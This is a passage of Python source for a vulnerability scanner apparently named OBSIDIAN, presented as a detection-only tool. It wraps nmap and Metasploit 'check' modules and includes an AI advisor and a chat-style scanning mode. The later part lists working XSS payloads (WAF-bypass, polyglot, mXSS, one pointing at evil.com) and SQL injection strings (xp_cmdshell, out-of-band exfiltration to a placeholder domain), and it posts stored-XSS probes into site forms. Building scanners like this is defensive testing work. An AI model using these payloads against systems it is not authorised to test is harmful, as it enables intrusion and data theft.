                    top = max(cves, key=lambda x: x[2])
                    cve_str = f" | CVE: {top[0]} (CVSS {top[2]})"

                # Severity based on CVE score
                sev = "Info"
                if cves:
                    max_score = max(c[2] for c in cves)
                    sev = ("Critical" if max_score >= 9.0
                           else "High" if max_score >= 7.0
                           else "Medium" if max_score >= 4.0
                           else "Low")

                cvss_s, cvss_v, _ = CVSS31.for_module("recon")
                findings.append(make_finding("recon",
                    f"nmap: {svc_name}/{proto} on port {port_id}" + (f" ({full_svc})" if full_svc else ""),
                    sev,
                    f"Port {port_id}/{proto} open. Service: {full_svc or svc_name}.{cve_str}",
                    f"Verify this service is intended. Patch to latest version. "
                    f"Restrict access via firewall if not public-facing.",
                    url=f"tcp://{domain}:{port_id}",
                    evidence=f"svc={full_svc}, cvss={cvss_s}",
                    cwe="CWE-200", confidence="High"))

                # NSE script output — vulnerability findings
                for script in port_el.findall("script"):
                    script_id  = script.get("id","")
                    script_out = script.get("output","").strip()
                    if not script_out: continue

                    # Only flag scripts with vulnerability indicators
                    VULN_INDICATORS = [
                        "VULNERABLE", "vulnerable", "CVE-", "EXPLOITABLE",
                        "State: VULNERABLE", "risk factor", "HIGH",
                    ]
                    if not any(ind in script_out for ind in VULN_INDICATORS):
                        continue

                    # Extract CVE from script output
                    cve_refs = re.findall(r"CVE-\d{4}-\d+", script_out)
                    cvss_score_m = re.search(r"CVSS:\s*(\d+\.?\d*)", script_out, re.I)
                    nse_cvss  = float(cvss_score_m.group(1)) if cvss_score_m else 0
                    nse_sev   = ("Critical" if nse_cvss >= 9.0
                                 else "High" if nse_cvss >= 7.0
                                 else "Medium" if nse_cvss >= 4.0
                                 else "High")  # default High if vuln found

                    logger.log("NMAP", f"NSE vuln: {script_id} on port {port_id}", "CRITICAL")
                    findings.append(make_finding("recon",
                        f"NSE [{script_id}] on port {port_id}: VULNERABLE",
                        nse_sev,
                        f"nmap NSE script '{script_id}' flagged port {port_id} as vulnerable. "
                        f"CVEs: {', '.join(cve_refs) or 'see output'}. "
                        f"Output: {script_out[:300]}",
                        "Apply vendor patch immediately. Verify with manual confirmation.",
                        url=f"tcp://{domain}:{port_id}",
                        payload=script_id,
                        cwe=cve_refs[0] if cve_refs else "CWE-1035",
                        evidence=f"nse_cvss={nse_cvss}, cves={cve_refs}",
                        confidence="High"))

    except Exception as e:
        logger.log("NMAP", f"XML parse error: {e}", "ERROR")
        # Fallback: parse text output
        if out_txt.exists():
            txt = out_txt.read_text(errors="ignore")
            for cve in set(re.findall(r"CVE-\d{4}-\d+", txt)):
                findings.append(make_finding("recon",
                    f"nmap CVE reference: {cve}", "High",
                    f"nmap scan output references {cve}.",
                    "Investigate and patch.",
                    url=f"tcp://{domain}", cwe=cve, confidence="Medium"))

    logger.log("NMAP", f"Deep scan complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# METASPLOIT CHECK-ONLY INTEGRATION (detection only, no exploitation)
# ─────────────────────────────────────────────────────────────────────────────
def tool_msf_check(target, cves, workdir):
    """
    Metasploit Framework — CHECK MODULE ONLY.
    Uses 'check' command to verify vulnerability presence WITHOUT exploitation.
    Never runs 'exploit' or 'run'. Never generates payloads.
    Returns True/False for each CVE — definitive confirmation of vulnerability.
    """
    findings = []
    if not cmd_exists("msfconsole"):
        logger.log("MSF-CHECK", "msfconsole not found — install Metasploit Framework", "WARNING")
        return findings

    domain = get_domain(target)

    # CVE → Metasploit check module mapping (detection modules only)
    CVE_TO_MODULE = {
        "CVE-2019-0708": ("auxiliary/scanner/rdp/cve_2019_0708_bluekeep",    3389, "BlueKeep RDP"),
        "CVE-2017-0144": ("auxiliary/scanner/smb/smb_ms17_010",              445,  "EternalBlue SMB"),
        "CVE-2020-0796": ("auxiliary/scanner/smb/smb_ghostcat",              445,  "SMBGhost"),
        "CVE-2014-0160": ("auxiliary/scanner/ssl/openssl_heartbleed",        443,  "Heartbleed"),
        "CVE-2021-41773": ("auxiliary/scanner/http/apache_normalize_path",   80,   "Apache Path Traversal"),
        "CVE-2020-1938":  ("auxiliary/scanner/http/tomcat_ghostcat",         8009, "Ghostcat Tomcat"),
        "CVE-2021-22005": ("auxiliary/scanner/http/vmware_vcenter_rce",      443,  "VMware vCenter"),
        "CVE-2022-22965": ("auxiliary/scanner/http/spring4shell",            80,   "Spring4Shell"),
        "CVE-2020-14882": ("auxiliary/scanner/http/weblogic_rce",            7001, "WebLogic RCE"),
        "CVE-2019-9193":  ("auxiliary/scanner/postgres/postgres_version",    5432, "PostgreSQL"),
        "CVE-2022-0543":  ("auxiliary/scanner/redis/redis_info",             6379, "Redis"),
        "CVE-2012-2122":  ("auxiliary/scanner/mysql/mysql_version",          3306, "MySQL"),
        "CVE-2019-10149": ("auxiliary/scanner/smtp/smtp_version",            25,   "Exim SMTP"),
        "CVE-2003-0352":  ("auxiliary/scanner/dcerpc/endpoint_mapper",       135,  "MS-RPC"),
    }

    for cve_id in cves:
        if cve_id not in CVE_TO_MODULE: continue
        module, port, desc = CVE_TO_MODULE[cve_id]

        logger.log("MSF-CHECK", f"Checking {cve_id} ({desc}) — CHECK ONLY", "TOOL")

        # Build MSF resource script — check ONLY, never exploit/run
        rc_script = workdir / f"msf_check_{cve_id.replace('-','_')}.rc"
        rc_content = f"""# OBSIDIAN — MSF CHECK ONLY (no exploitation)
# CVE: {cve_id} | Module: {module}
use {module}
set RHOSTS {domain}
set RPORT {port}
set THREADS 1
set ConnectTimeout 10
check
exit
"""
        rc_script.write_text(rc_content)

        # Run msfconsole with check-only resource script
        out = run_cmd([
            "msfconsole",
            "-q",           # quiet (no banner)
            "-r", str(rc_script),  # resource file
        ], timeout=60)

        rc_script.unlink(missing_ok=True)

        if not out or out in ("TIMEOUT", "NOT_FOUND"): continue

        # Parse check result
        is_vulnerable = (
            "The target appears to be vulnerable" in out or
            "is vulnerable" in out.lower() or
            "Vulnerable!" in out
        )
        not_vulnerable = (
            "The target is not exploitable" in out or
            "Cannot reliably check" in out or
            "not vulnerable" in out.lower()
        )

        if is_vulnerable:
            score, vector, _ = CVSS31.for_module("recon")
            # Get CVSS from our DB
            for db_port, db_cves in PORT_CVE_DB.items():
                for db_cve, db_desc, db_score in db_cves:
                    if db_cve == cve_id:
                        score = db_score
                        break

            logger.log("MSF-CHECK",
                f"CONFIRMED VULNERABLE: {cve_id} ({desc}) on {domain}:{port}",
                "CRITICAL")
            findings.append(make_finding("recon",
                f"MSF Confirmed: {cve_id} ({desc})", "Critical",
                f"Metasploit 'check' module confirmed {cve_id} ({desc}) on {domain}:{port}. "
                f"This is a definitive vulnerability confirmation (not a theoretical risk).",
                f"Patch immediately. {cve_id} has real exploits in the wild.",
                url=f"tcp://{domain}:{port}",
                payload=f"msf module: {module} (check only)",
                cwe=cve_id,
                evidence=f"msf_check=VULNERABLE, cvss={score}",
                confidence="High"))
        elif not_vulnerable:
            logger.log("MSF-CHECK", f"Not vulnerable: {cve_id}", "INFO")
        else:
            logger.log("MSF-CHECK", f"Inconclusive: {cve_id}", "WARNING")

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# AI ADVISOR MODE — Claude API analyses findings and gives next steps
# ─────────────────────────────────────────────────────────────────────────────
def ai_advisor_analyze(findings_list, target, verbose=False):
    """
    Use Claude API to analyse scan findings and produce:
    1. Executive summary
    2. Attack chain reconstruction
    3. Prioritised remediation roadmap
    4. Next recommended scan steps
    Based on: arXiv:2501.06963 — Claude Opus PTES methodology
    """
    try:
        import urllib.request, json as _json

        if not findings_list:
            return "No findings to analyse."

        # Build findings summary for the prompt
        findings_text = "\n".join([
            f"[{f.get('severity','?')}] {f.get('title','?')} | "
            f"OWASP: {f.get('owasp_id','?')} | "
            f"MITRE: {f.get('mitre_id','?')} | "
            f"URL: {f.get('url','?')}"
            for f in findings_list[:40]  # top 40
        ])

        sev_counts = {}
        for f in findings_list:
            s = f.get('severity','?')
            sev_counts[s] = sev_counts.get(s,0) + 1

        prompt = f"""You are a senior penetration tester reviewing automated scan results.
Target: {target}
Scan Summary: {sev_counts}
Total findings: {len(findings_list)}

Findings (top {min(40,len(findings_list))}):
{findings_text}

Please provide a PTES-structured analysis:

1. EXECUTIVE SUMMARY (2-3 sentences for management)
2. RISK RATING (Critical/High/Medium/Low with justification)
3. ATTACK CHAIN (what could an attacker chain together from these findings?)
4. TOP 5 PRIORITIES (most critical to fix first, with CVSS rationale)
5. RECOMMENDED NEXT STEPS (specific additional tests to run)
6. QUICK WINS (fixes that can be done in <1 hour)

Be specific and technical. Reference actual CVEs and OWASP categories from the findings."""

        payload = _json.dumps({
            "model":      "claude-sonnet-4-20250514",
            "max_tokens": 1500,
            "messages":   [{"role": "user", "content": prompt}]
        }).encode()

        req = urllib.request.Request(
            "https://api.anthropic.com/v1/messages",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = _json.loads(resp.read())
            return data["content"][0]["text"]

    except Exception as e:
        return f"AI Advisor unavailable: {e}\nManual review required."


# ─────────────────────────────────────────────────────────────────────────────
# CONVERSATIONAL SCAN MODE (Ask the scanner)
# ─────────────────────────────────────────────────────────────────────────────
def conversational_scan_mode():
    """
    AI-driven conversational pentesting interface.
    You talk to the scanner in natural language.
    Based on PTES methodology — detection & analysis only.
    """
    clr()
    show_banner()
    menu_title("🤖  AI-ASSISTED PENTEST MODE  |  PTES METHODOLOGY")

    print(f"  {C.GRN}Ask the scanner anything:{C.RST}")
    print(f"  {C.DIM}  'scan 192.168.1.1'")
    print(f"  {C.DIM}  'what ports are risky on ums.mydsi.org'")
    print(f"  {C.DIM}  'check if target is vulnerable to bluekeep'")
    print(f"  {C.DIM}  'run full PTES phase 2 on example.com'")
    print(f"  {C.DIM}  'analyse my last scan findings'")
    print(f"  {C.DIM}  type 'exit' to return to main menu{C.RST}")
    print()
    menu_divider("─", C.DIM)

    last_findings  = []
    last_target    = ""
    conversation   = []

    WORK_DIR.mkdir(exist_ok=True)

    while True:
        try:
            user_input = input(f"\n  {C.PUR}☠ Ask scanner :{C.RST} ").strip()
        except (KeyboardInterrupt, EOFError):
            break
        if not user_input or user_input.lower() in ("exit","quit","back","q"):
            break

        conversation.append({"role":"user","content":user_input})
        print()

        # ── Intent detection (local, no API needed for routing) ───────────────
        inp_lower = user_input.lower()

        # Detect target URL/IP in input
        url_match = re.search(
            r"(?:https?://)?(?:[a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}(?:/\S*)?|"
            r"\b(?:\d{1,3}\.){3}\d{1,3}\b(?:/\d{1,2})?",
            user_input
        )
        if url_match:
            last_target = url_match.group(0)
            if not last_target.startswith("http"):
                last_target = "https://" + last_target

        # ── PTES Phase routing ────────────────────────────────────────────────
        if any(w in inp_lower for w in ["full scan","full ptes","complete scan","all phases"]):
            if not last_target:
                print(f"  {C.YLW}Tell me the target first. E.g. 'full scan example.com'{C.RST}")
                continue
            print(f"  {C.GRN}Launching full PTES scan on {last_target} …{C.RST}\n")
            try:
                out_path = str(WORK_DIR / f"ai_scan_{datetime.now().strftime('%H%M%S')}.json")
                run_scan(target=last_target, output=out_path, html=True,
                        auto_install=False, threads=THREADS)
                # Load findings for analysis
                if Path(out_path).exists():
                    data = json.loads(Path(out_path).read_text())
                    last_findings = data.get("findings",[])
                    print(f"\n  {C.GRN}✔ Scan complete — {len(last_findings)} findings{C.RST}")
            except Exception as e:
                print(f"  {C.RED}Scan error: {e}{C.RST}")

        elif any(w in inp_lower for w in ["port","ports","open port","nmap"]):
            tgt = last_target or (url_match.group(0) if url_match else "")
            if not tgt:
                print(f"  {C.YLW}Specify a target. E.g. 'scan ports on 10.0.0.1'{C.RST}")
                continue
            print(f"  {C.GRN}Running nmap deep scan on {tgt} …{C.RST}")
            new_f = tool_nmap_deep(tgt, WORK_DIR)
            last_findings.extend(new_f)
            print(f"  {C.GRN}✔ Found {len(new_f)} port/service findings{C.RST}")
            for f in new_f[:8]:
                sev_col = C.RED if f.severity in ("Critical","High") else C.YLW if f.severity=="Medium" else C.DIM
                print(f"    {sev_col}[{f.severity}]{C.RST} {f.title}")

        elif any(w in inp_lower for w in ["bluekeep","cve-2019-0708","rdp"]):
            tgt = last_target
            if not tgt:
                print(f"  {C.YLW}Specify a target first.{C.RST}"); continue
            print(f"  {C.GRN}Running MSF check for BlueKeep (CVE-2019-0708) on {tgt} …{C.RST}")
            new_f = tool_msf_check(tgt, ["CVE-2019-0708"], WORK_DIR)
            last_findings.extend(new_f)
            if new_f:
                print(f"  {C.RED}VULNERABLE: BlueKeep confirmed on {tgt}!{C.RST}")
            else:
                print(f"  {C.GRN}Not vulnerable to BlueKeep (or MSF check inconclusive){C.RST}")

        elif any(w in inp_lower for w in ["eternalblue","ms17-010","smb","445"]):
            tgt = last_target
            if not tgt:
                print(f"  {C.YLW}Specify a target first.{C.RST}"); continue
            print(f"  {C.GRN}Running MSF check for EternalBlue (CVE-2017-0144) …{C.RST}")
            new_f = tool_msf_check(tgt, ["CVE-2017-0144"], WORK_DIR)
            last_findings.extend(new_f)
            if new_f:
                print(f"  {C.RED}VULNERABLE: EternalBlue confirmed!{C.RST}")
            else:
                print(f"  {C.GRN}EternalBlue check: not vulnerable / inconclusive{C.RST}")

        elif any(w in inp_lower for w in ["analyse","analyze","advisor","summary","findings","report"]):
            if not last_findings:
                print(f"  {C.YLW}No findings yet. Run a scan first.{C.RST}"); continue
            print(f"  {C.GRN}AI Advisor analysing {len(last_findings)} findings …{C.RST}\n")
            ev = threading.Event()
            t  = threading.Thread(target=spinner_task,
                                  args=("Claude AI analysing your findings …", ev, C.PUR), daemon=True)
            t.start()
            analysis = ai_advisor_analyze([f.to_dict() for f in last_findings]
                                          if hasattr(last_findings[0],'to_dict')
                                          else last_findings,
                                          last_target)
            ev.set(); t.join()
            print(f"\n  {C.PUR}{'═'*60}{C.RST}")
            print(f"  {C.PUR}{C.BLD}☠ AI ADVISOR ANALYSIS{C.RST}")
            print(f"  {C.PUR}{'═'*60}{C.RST}\n")
            for line in analysis.split('\n'):
                print(f"  {C.WHT}{line}{C.RST}")
            print()

        elif any(w in inp_lower for w in ["ptes","phase","methodology","recon","intelligence"]):
            print(f"\n  {C.PUR}{C.BLD}PTES METHODOLOGY — 7 PHASES{C.RST}\n")
            for phase_n, (name, desc) in PTES_PHASES.items():
                done_mark = C.GRN + "●" if last_findings else C.DIM + "○"
                print(f"  {done_mark}{C.RST}  Phase {phase_n}: {C.WHT}{name}{C.RST}")
                print(f"           {C.DIM}{desc}{C.RST}")

        elif any(w in inp_lower for w in ["help","what can","commands","options"]):
            print(f"\n  {C.PUR}AVAILABLE COMMANDS:{C.RST}")
            cmds = [
                ("scan <target>",                "Full PTES scan"),
                ("ports on <target>",            "Deep nmap + NSE"),
                ("check bluekeep on <target>",   "MSF CVE validation"),
                ("check eternalblue on <target>","MSF CVE validation"),
                ("analyse findings",             "AI Advisor (Claude API)"),
                ("ptes phases",                  "Show PTES methodology"),
                ("full scan <target>",           "All 7 PTES phases"),
                ("exit",                         "Return to main menu"),
            ]
            for cmd, desc in cmds:
                print(f"    {C.GRN}{cmd:<36}{C.RST} {C.DIM}{desc}{C.RST}")

        elif last_target or url_match:
            # Generic scan request with a target detected
            tgt = last_target or (url_match.group(0) if url_match else "")
            if not tgt.startswith("http"):
                tgt = "https://" + tgt
            last_target = tgt
            print(f"  {C.GRN}Running targeted scan on {tgt} …{C.RST}")
            try:
                session = make_session()
                # Run key passive modules
                new_f  = []
                new_f += module_recon(tgt, session)
                new_f += module_security_headers(tgt, session)
                new_f += module_ssl(tgt)
                new_f += module_cookies(tgt, session)
                new_f += module_waf_detect(tgt, session)
                last_findings.extend(new_f)
                print(f"  {C.GRN}✔ Quick scan: {len(new_f)} findings{C.RST}")
                for f in new_f[:6]:
                    sc = C.RED if f.severity in ("Critical","High") else C.YLW if f.severity=="Medium" else C.DIM
                    print(f"    {sc}[{f.severity}]{C.RST} {f.title}")
                if len(new_f) > 6:
                    print(f"    {C.DIM}… and {len(new_f)-6} more. Say 'analyse findings' for AI review.{C.RST}")
            except Exception as e:
                print(f"  {C.RED}Scan error: {e}{C.RST}")

        else:
            # Unknown — ask AI advisor for interpretation
            print(f"  {C.DIM}Try: 'scan example.com', 'check bluekeep on <ip>', 'analyse findings'{C.RST}")
            print(f"  {C.DIM}Or type 'help' for all commands.{C.RST}")

    print(f"\n  {C.PUR}Returning to main menu …{C.RST}")





# ═══════════════════════════════════════════════════════════════════════════════
# OBSIDIAN v10.0 — NEW MODULES & UPGRADES
# ═══════════════════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────────────────────────────────
# UPGRADED XSS — 50+ payloads, 8 context types, WAF bypass, mXSS, stored
# ─────────────────────────────────────────────────────────────────────────────
XSS_PAYLOADS_V7 = {
    "html_context": [
        "<CANARY>",
        "<CANARY onmouseover=1>",
        "<img src=x onerror=CANARY>",
        "<svg onload=CANARY>",
        "<details open ontoggle=CANARY>",
        "<video><source onerror=CANARY>",
        "<audio src=x onerror=CANARY>",
        "<body onload=CANARY>",
        "<input autofocus onfocus=CANARY>",
        "<select autofocus onfocus=CANARY>",
        "<textarea autofocus onfocus=CANARY>",
        "<keygen autofocus onfocus=CANARY>",
        "<marquee onstart=CANARY>",
        "<object data=CANARY>",
        "<embed src=CANARY>",
        "<iframe srcdoc=<img src onerror=CANARY>>",
        "<form><button formaction=javascript:CANARY>",
        "<math><mtext></table></math><img src onerror=CANARY>",
    ],
    "attr_context": [
        "'><CANARY>",
        '"\'><CANARY>',
        "\" onmouseover=\"CANARY",
        "' onmouseover='CANARY",
        "' onfocus='CANARY' autofocus='",
        '" onfocus="CANARY" autofocus="',
        "\" onload=\"CANARY",
        "javascript:CANARY//",
        "data:text/html,<CANARY>",
    ],
    "js_context": [
        "';CANARY//",
        '";CANARY//',
        "`CANARY`",
        "'-CANARY-'",
        "\\';CANARY//",
        "</script><CANARY>",
        "};CANARY;{",
        "\\n CANARY \\n",
    ],
    "url_context": [
        "javascript:CANARY",
        "data:text/html,<script>CANARY</script>",
        "//evil.com/CANARY",
        "vbscript:CANARY",
    ],
    "css_context": [
        "expression(CANARY)",
        "</style><CANARY>",
        "};CANARY{",
    ],
    "waf_bypass": [
        # Case variation
        "<ScRiPt>CANARY</sCrIpT>",
        # HTML entities
        "<img src=x onerror=&#CANARY;>",
        # Unicode
        "\u003cCANARY\u003e",
        # Double encoding
        "%253Cscript%253ECANARY%253C/script%253E",
        # Null bytes (mXSS)
        "<scr\x00ipt>CANARY</scr\x00ipt>",
        # Comments
        "<!-CANARY->",
        "</**/script>CANARY</script>",
        # Newlines
        "<img\nsrc=x\nonerror=CANARY>",
        "<img\tsrc=x\tonerror=CANARY>",
        # Backticks
        "<img src=`x` onerror=CANARY>",
        # Slash variations
        "<script/CANARY>",
        # Prototype pollution XSS
        "__proto__[CANARY]=1",
        # JSONP
        "callback=CANARY",
        # Expression (IE legacy)
        "xss:expression(CANARY)",
        # SVG namespace
        "<svg xmlns='http://www.w3.org/2000/svg'><script>CANARY</script></svg>",
        # Event handler via style
        "<div style='width:expression(CANARY)'>",
        # base64
        "<CANARY src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=CANARY )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=CANARY()//>>",
        "'\"-->CANARY<--'\"",
        "</script><svg/onload=CANARY>",
    ],
    "mxss": [
        # Browser parsing differences trigger XSS after sanitisation
        "<listing>CANARY</listing>",
        "<xmp>CANARY</xmp>",
        "<noscript>CANARY</noscript>",
        "<noembed>CANARY</noembed>",
        "<noframes>CANARY</noframes>",
        "<!--[if]><CANARY><![endif]-->",
        "<title>CANARY</title>",
        "<plaintext>CANARY",
    ],
}

def module_xss_v7(target, session):
    """
    A03/T1059.007: XSS v7 — 50+ payloads, 8 context types, WAF bypass, mXSS.
    Zero-FP via:
    1. Unique canary per param per run
    2. Benign echo gate (if benign string also reflects → skip)
    3. Content-Type must be text/html
    4. HTML encoding check (all 5 forms)
    5. Comment-wrapping check
    6. Baseline similarity gate (>98% similar = no change)
    7. Reflected string must appear in HTML context (not inside script string)
    """
    findings = []
    ctx = get_ctx()

    FUZZ = ["q","s","search","id","name","lang","keyword","query","page","input",
            "msg","text","title","value","data","content","type","cat","term",
            "user","username","email","subject","body","comment","note","ref",
            "redirect","url","next","redir","callback","return","dest","src",
            "param","var","key","val","view","item","product","category","tag",
            "filter","sort","order","from","to","format","output","mode","action",
            "file","path","template","theme","lang","locale","currency","country",
            "zip","code","token","state","scope","response_type","nonce","client_id"]

    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    if ctx:
        params = ctx.prioritise_params(params)

    for p in params:
        CANARY = f"ddX{hashlib.md5((str(time.time())+p+str(id(p))).encode()).hexdigest()[:10]}"

        bl = ctx.baseline(target) if ctx else safe_get(session, target)
        if not bl or CANARY in bl.text:
            continue

        # Benign echo gate
        BENIGN = f"ddBn{hashlib.md5((CANARY+'safe').encode()).hexdigest()[:10]}"
        try:
            bn_resp = session.get(inject_param(target, p, BENIGN), timeout=TIMEOUT)
            if bn_resp and BENIGN in bn_resp.text:
                continue  # Echo-all — skip to avoid FP
        except Exception:
            pass

        # Try all payload contexts
        all_payloads = []
        for ctx_name, payloads in XSS_PAYLOADS_V7.items():
            for pl_tpl in payloads:
                pl = pl_tpl.replace("CANARY", CANARY)
                all_payloads.append((pl, ctx_name))

        for pl, ctx_name in all_payloads:
            try:
                resp = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not resp:
                    continue
                ct = resp.headers.get("Content-Type", "")
                if "text/html" not in ct and "application/xhtml" not in ct:
                    continue
                if CANARY not in resp.text:
                    continue

                # Gate: not HTML-entity encoded
                if any(enc in resp.text for enc in [
                    f"&lt;{CANARY}", f"&#60;{CANARY}", f"&amp;{CANARY}",
                    CANARY.replace("<", "&lt;"), CANARY.replace(">", "&gt;"),
                    f"%3C{CANARY}", f"\\u003c{CANARY}",
                ]):
                    continue

                # Gate: not in HTML comment
                if f"<!--" in resp.text:
                    import re as _re
                    comments = _re.findall(r"<!--.*?-->", resp.text, _re.S)
                    if any(CANARY in c for c in comments):
                        continue

                # Gate: baseline similarity
                if ctx and ctx.similar_to_baseline(resp.text, target, 0.98):
                    continue

                score, vector, _ = CVSS31.for_module("xss")
                logger.log("XSS", f"[{ctx_name}] XSS in '{p}'", "CRITICAL")
                findings.append(make_finding("xss",
                    f"Reflected XSS [{ctx_name}] in '{p}'", "High",
                    f"Canary reflected unencoded in {ctx_name} context via '{p}'. Payload: {pl[:60]}",
                    "HTML-encode all output. Use auto-escaping templates. Implement strict CSP. "
                    "Use DOMPurify for dynamic HTML. Add X-XSS-Protection header.",
                    url=inject_param(target, p, pl),
                    payload=pl[:100], cwe="CWE-79",
                    evidence=f"context={ctx_name}, cvss={score}, {vector}",
                    confidence="High"))
                break  # One finding per param
            except Exception:
                pass
        if findings and findings[-1].module == "xss":
            pass  # Continue to next param

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# STORED XSS — POST payload then GET to verify persistence
# ─────────────────────────────────────────────────────────────────────────────
def module_stored_xss(target, session):
    """
    A03: Stored/Persistent XSS — inject via POST forms, then verify on GET.
    Zero-FP: canary must appear on subsequent GET that attacker controls.
    """
    findings = []
    logger.log("STORED-XSS", "Stored XSS detection …")

    resp = safe_get(session, target)
    if not resp: return findings

    # Find POST forms
    forms = re.findall(r'<form[^>]*action=["\']?([^"\'>\s]+)["\']?[^>]*>(.*?)</form>',
                       resp.text, re.S | re.I)
    if not forms:
        # Try generic POST endpoints
        forms = [("/api/comment", ""), ("/api/feedback", ""),
                 ("/comments", ""), ("/feedback", ""), ("/review", ""),
                 ("/api/post", ""), ("/submit", ""), ("/api/message", "")]
        forms = [(f, "") for f in forms]

    CANARY = f"ddSTXSS{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    XSS_PL = f"<img src=x onerror=console.log('{CANARY}')>{CANARY}"

    for action, form_body in forms[:8]:
        post_url = urljoin(target, action) if isinstance(action, str) and action else target

        # Extract field names from form
        fields = re.findall(r'name=["\']([^"\']+)["\']', form_body)
        if not fields:
            fields = ["comment", "message", "body", "content", "text", "name", "title"]

        for field in fields[:5]:
            if field.lower() in ("csrf", "_token", "authenticity_token", "__RequestVerificationToken"):
                continue
            try:
                data = {f: ("benign test value" if f != field else XSS_PL)
                        for f in fields}
                r = session.post(post_url, data=data, timeout=TIMEOUT)
                if not r or r.status_code not in (200, 201, 302):
                    continue

                # Now GET the page(s) where this might be displayed
                check_urls = [target, post_url,
                              target.rstrip("/") + "/comments",
                              target.rstrip("/") + "/reviews",
                              target.rstrip("/") + "/feedback"]

                for check_url in check_urls:
                    try:
                        check_r = session.get(check_url, timeout=TIMEOUT)
                        if check_r and CANARY in check_r.text:
                            # FP gate: content-type must be HTML
                            if "text/html" not in check_r.headers.get("Content-Type", ""):
                                continue
                            # FP gate: not HTML-encoded
                            if f"&lt;img" in check_r.text or f"&amp;" in check_r.text:
                                continue
                            score, vector, _ = CVSS31.for_module("xss")
                            logger.log("STORED-XSS",
                                       f"Stored XSS via '{field}' at {post_url}", "CRITICAL")
                            findings.append(make_finding("xss",
                                f"Stored XSS via '{field}' on {post_url}", "High",
                                f"XSS payload stored via POST to '{post_url}' field '{field}' "
                                f"and reflected unencoded on GET {check_url}.",
                                "HTML-encode all stored user content before rendering. "
                                "Use Content Security Policy. Sanitise on input AND output.",
                                url=post_url, payload=XSS_PL[:80],
                                cwe="CWE-79",
                                evidence=f"stored_at={post_url}, reflected_at={check_url}, cvss={score}",
                                confidence="High"))
                            return findings
                    except Exception:
                        pass
            except Exception:
                pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# UPGRADED SQLi — WAF bypass, stacked queries, OOB, JSON inject, 40+ payloads
# ─────────────────────────────────────────────────────────────────────────────
SQLI_PAYLOADS_V7 = {
    "error_basic": [
        "'", '"', "''", '""', "`", "\\",
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "\" OR 1=1--",
        "1'", "1\"", "1`",
    ],
    "waf_bypass": [
        # Comment variations
        "'/**/OR/**/'1'='1",
        "' /*!50000OR*/ '1'='1",
        "' OR--+'1'='1",
        # Case variations
        "' oR '1'='1",
        "' Or '1'='1",
        # Encoding
        "%27 OR %271%27=%271",
        "' %4fR '1'='1",
        # Double URL encoding
        "%2527 OR %25271%2527=%25271",
        # Newline bypass
        "'\nOR\n'1'='1",
        "'\rOR\r'1'='1",
        # Null byte
        "'\x00OR '1'='1",
        # HPP bypass
        "' OR '1'='1' -- -",
        "' OR '1'='1'/*",
        "' OR '1'='1'#",
        "' OR '1'='1'%00",
    ],
    "stacked": [
        "'; SELECT 1--",
        "'; SELECT SLEEP(0)--",
        "'; WAITFOR DELAY '0:0:0'--",
        "'; INSERT INTO nothing VALUES(1)--",
        "'; UPDATE nothing SET a=1--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; EXEC sp_execute('SELECT 1')--",
    ],
    "union_detect": [
        "' ORDER BY 1--",
        "' ORDER BY 2--",
        "' ORDER BY 3--",
        "' ORDER BY 10--",
        "' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
    ],
    "json_inject": [
        # MySQL JSON columns
        "' AND JSON_EXTRACT(data,'$.key')='1",
        "' AND 1=JSON_VALUE(data,'$.key')--",
        # PostgreSQL JSON
        "' AND data->>'key'='1",
        "' AND (data->>'key')::int=1--",
        # MongoDB-style
        '{"$gt": ""}',
        '{"$where": "1==1"}',
    ],
    "oob_detect": [
        # DNS OOB via interactsh (placeholder — actual domain set at runtime)
        "' AND LOAD_FILE('\\\\\\\\OOB_DOMAIN\\\\x')--",
        "'; exec master..xp_dirtree '\\\\OOB_DOMAIN\\x'--",
        "' UNION SELECT UTL_HTTP.REQUEST('http://OOB_DOMAIN/')--",
        "' AND 1=(SELECT 1 FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=OOB_DOMAIN;','select 1'))--",
    ],
}

SQLI_ERROR_PATTERNS_V7 = {
    "MySQL":      re.compile(r"SQL syntax.*MySQL|You have an error in your SQL|MySQLSyntaxError|mysql_fetch|mysqli_|Warning.*mysql", re.I),
    "PostgreSQL": re.compile(r"PostgreSQL.*ERROR|pg_query\(\)|PSQLException|org\.postgresql|ERROR:\s+syntax error at|ERROR:\s+column", re.I),
    "MSSQL":      re.compile(r"Driver.*SQL.*Server|Unclosed quotation|SqlException|OLE DB.*SQL Server|Incorrect syntax near|Conversion failed|String or binary data", re.I),
    "Oracle":     re.compile(r"ORA-\d{5}|oracle.*error|quoted string not properly|missing right parenthesis", re.I),
    "SQLite":     re.compile(r"SQLite/JDBCDriver|sqlite3\.OperationalError|\[SQLITE_ERROR\]|SQLiteException|unrecognized token", re.I),
    "DB2":        re.compile(r"DB2 SQL error|SQLCODE|DB2Exception|com\.ibm\.db2", re.I),
    "Sybase":     re.compile(r"Sybase.*error|com\.sybase|SybSQLException", re.I),
    "Generic":    re.compile(r"SQL command not properly ended|unterminated quoted string|quoted identifier|syntax error.*near|unexpected end of SQL", re.I),
}

def module_sqli_v7(target, session):
    """
    A03/T1190: SQL Injection v7 — 40+ payloads, WAF bypass, stacked queries,
    JSON inject, ORDER BY column count, OOB via interactsh.
    Zero-FP: 5 confirmation gates on all detections.
    """
    findings = []
    ctx = get_ctx()

